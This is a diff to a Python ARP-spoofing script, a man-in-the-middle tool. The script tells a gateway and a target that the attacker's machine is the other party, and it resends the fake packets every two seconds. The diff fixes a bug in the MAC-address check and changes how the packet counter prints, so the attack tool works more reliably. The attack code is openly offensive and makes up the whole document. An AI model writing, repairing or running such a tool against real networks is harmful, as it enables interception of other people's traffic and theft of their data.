@@ -14,7 +14,7 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    if not target_ip:
+    if not target_mac:
         print(f"Could not find MAC address for {target_ip}. Exiting.")
         sys.exit()
     
@@ -51,7 +51,7 @@ def start_spoofing(target_ip, gateway_ip):
             spoof(gateway_ip, target_ip) # tell the gateway we are the target
 
             send_packets_count += 2
-            print(f"\r[+]Packets sent: {send_packets_count}", end="")
+            print(f"\n[+]Packets sent: {send_packets_count}", end="")
 
             time.sleep(2) # arp table cache their entries but they still expire
             # we must send the fake packets every 2 seconds
